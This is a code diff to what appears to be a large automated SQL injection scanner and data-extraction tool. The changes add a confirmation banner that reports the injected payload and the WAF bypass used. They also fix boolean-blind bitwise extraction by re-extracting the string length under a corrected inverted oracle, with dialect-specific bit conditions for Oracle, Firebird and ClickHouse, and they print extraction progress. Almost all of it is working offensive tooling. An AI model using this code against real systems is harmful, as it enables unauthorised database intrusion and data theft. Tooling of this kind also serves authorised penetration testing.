@@ -127315,7 +127315,34 @@ class ScannerV13(ScannerV12):
                     self._ui.add_vuln(param, det.technique, det.dbms, det.confidence)
                     self.session.save()
 
-                    #  Immediate extraction on each confirmed finding 
+                    # BUG-CONFIRMED-BANNER-MISSING FIX: The detailed "[!!] SQL injection
+                    # confirmed!" banner (with Parameter/URL/Technique/DBMS/Bypass/Confidence/
+                    # Payload/Requests fields) was only printed in TechniqueCascadeEngine.
+                    # scan_surface() when _scanner_ref is None (standalone mode).  When running
+                    # through V13Scanner (the default), _scanner_ref is always set, so the
+                    # banner was unconditionally skipped and the user never saw the confirmation
+                    # summary.  Fix: print the banner here in the V13 path where all the
+                    # required fields (param, url, det, cascade_r) are available.
+                    _v13_disp_param = ('path-injection'
+                                       if param in ('__path__', 'path-injection')
+                                       else param)
+                    _v13_disp_payload = (getattr(det, 'exact_sent_payload', None)
+                                         or det.payload or '')
+                    _v13_bypass = getattr(cascade_r, 'bypass_used', '') or ''
+                    _v13_reqs   = getattr(cascade_r, 'total_requests', 0)
+                    print("", flush=True)
+                    print("[!!] SQL injection confirmed!", flush=True)
+                    print(f"    Parameter : {_v13_disp_param!r}", flush=True)
+                    print(f"    URL       : {ep.url[:80]}", flush=True)
+                    print(f"    Technique : {det.technique}", flush=True)
+                    print(f"    DBMS      : {det.dbms or 'unknown'}", flush=True)
+                    print(f"    Bypass    : {('tamper:' + _v13_bypass) if _v13_bypass else 'none'}", flush=True)
+                    print(f"    Confidence: {det.confidence:.0%}", flush=True)
+                    print(f"    Payload   : {_v13_disp_payload[:80]!r}", flush=True)
+                    print(f"    Requests  : {_v13_reqs}", flush=True)
+                    print("", flush=True)
+
+                    #  Immediate extraction on each confirmed finding
                     _no_extract_val = getattr(cfg, "no_extract", False)
                     # BUG-5B FIX: The old guard `len(_extracting_params)==0` is local to
                     # this scanner instance.  If a concurrent header scan (running as a
@@ -132206,7 +132233,29 @@ class ScannerV14(ScannerV13):
                     if result.dbms:
                         self.config._detected_dbms = result.dbms
 
-                    #  IMMEDIATE EXTRACTION  don't wait for all endpoints 
+                    # BUG-CONFIRMED-BANNER-MISSING-V14 FIX: same root cause as V13 path.
+                    # The detailed "[!!] SQL injection confirmed!" banner was never printed
+                    # in the V14 scanner path — only LOG.info was called.  Print it here
+                    # where param, ep.url, result, and bypass are all available.
+                    _v14_disp_param = ('path-injection'
+                                       if param in ('__path__', 'path-injection')
+                                       else param)
+                    _v14_disp_payload = (getattr(result, 'exact_sent_payload', None)
+                                         or result.payload or '')
+                    _v14_reqs = getattr(result, 'total_requests', 0)
+                    print("", flush=True)
+                    print("[!!] SQL injection confirmed!", flush=True)
+                    print(f"    Parameter : {_v14_disp_param!r}", flush=True)
+                    print(f"    URL       : {ep.url[:80]}", flush=True)
+                    print(f"    Technique : {result.technique}", flush=True)
+                    print(f"    DBMS      : {result.dbms or 'unknown'}", flush=True)
+                    print(f"    Bypass    : {('tamper:' + bypass) if bypass and bypass not in ('direct','waf_bypass_unknown') else bypass or 'none'}", flush=True)
+                    print(f"    Confidence: {result.confidence:.0%}", flush=True)
+                    print(f"    Payload   : {_v14_disp_payload[:80]!r}", flush=True)
+                    print(f"    Requests  : {_v14_reqs}", flush=True)
+                    print("", flush=True)
+
+                    #  IMMEDIATE EXTRACTION  don't wait for all endpoints
                     if not getattr(cfg, "no_extract", False):
                         # Use the detection's actual param (may differ from loop param
                         # if detection came from a BG header/method scan)
@@ -157980,6 +158029,9 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             except Exception:
                 _sanity_true_r = None
             if _sanity_true_r is False:
+                print(f"[Novel] {label}: oracle sanity detected INVERTED polarity "
+                      "(always-false→True, 1=1→False); wrapping eval_fn and "
+                      "re-extracting length with corrected oracle", flush=True)
                 LOG.warning("[Novel] %s: oracle sanity detected INVERTED polarity "
                             "(always-false→True, 1=1→False); wrapping eval_fn to flip output "
                             "and retrying extraction with corrected oracle",
@@ -157991,6 +158043,45 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
                         return None
                     return not bool(_r)
                 eval_fn = _inverted_eval_fn
+                # BUG-INVERTED-LENGTH-FIX: The length was already extracted above with
+                # the ORIGINAL (inverted) oracle, producing a wrong bit-complement value.
+                # For example, actual length=27 (11011) → inverted oracle gives 11100100=228,
+                # which either triggers the >200 guard (return "") or gives a wrong length
+                # that causes char extraction to stop too early or run too long.
+                # Fix: re-extract the length with the now-corrected (wrapped) eval_fn so
+                # char extraction uses the correct string length.
+                length = 0
+                for _inv_bit in range(7, -1, -1):
+                    _inv_mask = 1 << _inv_bit
+                    _inv_len_expr = len_tmpl.format(q=query)
+                    if dbms == "Oracle":
+                        _inv_len_cond = f"BITAND({_inv_len_expr},{_inv_mask})={_inv_mask}"
+                    elif dbms == "Firebird":
+                        _inv_len_cond = f"BIN_AND({_inv_len_expr},{_inv_mask})={_inv_mask}"
+                    elif dbms == "ClickHouse":
+                        _inv_len_cond = f"bitAnd({_inv_len_expr},{_inv_mask})={_inv_mask}"
+                    else:
+                        _inv_len_cond = f"{_inv_len_expr}&{_inv_mask}={_inv_mask}"
+                    try:
+                        _inv_r = await eval_fn(_inv_len_cond)
+                        if _inv_r is None:
+                            length = 0
+                            break
+                        if _inv_r:
+                            length |= _inv_mask
+                    except Exception:
+                        length = 0
+                        break
+                    await asyncio.sleep(delay * 0.3)
+                if length == 0 or length > 200:
+                    LOG.warning("[Novel] %s: re-extracted length=%d invalid after polarity "
+                                "correction — aborting", label, length)
+                    print(f"[Novel] {label}: re-extracted length={length} invalid after "
+                          "polarity correction — aborting", flush=True)
+                    return ""
+                print(f"[Novel] {label}: re-extracted length={length} with corrected oracle — "
+                      "starting char extraction", flush=True)
+                LOG.info("[Novel] %s: re-extracted length=%d after polarity correction", label, length)
             elif _sanity_true_r is True:
                 LOG.warning("[Novel] %s: oracle sanity FAILED — oracle is WAF-LIMITED "
                             "(both 1=1 and always-false return True = WAF blocks all "
@@ -158208,11 +158299,20 @@ async def _bitwise_extract_with_oracle(eval_fn, query: str, dbms: str,
             result += chr(char_val)
             _novel_consec_fails = 0  # reset on success
             LOG.info("[Novel] %s: [%d/%d] %s", label, pos, length, result)
+            # BUG-NOVEL-STALL-VISIBILITY FIX: Print progress every 5 chars so the
+            # user can see extraction is proceeding (previously only LOG.info was
+            # called here, which is invisible at default log levels — the terminal
+            # showed nothing for the entire extraction duration, making a long
+            # bitwise extraction look like a stall/hang).
+            if pos % 5 == 0 or pos == 1:
+                print(f"[Novel] {label}: extracting [{pos}/{length}] → {result!r}", flush=True)
         else:
             _novel_consec_fails += 1
             if _novel_consec_fails >= 3:
                 break  # 3 consecutive non-printable positions = genuine end
 
+    if result:
+        print(f"[Novel] {label}: extraction complete → {result!r}", flush=True)
     return result
 
 
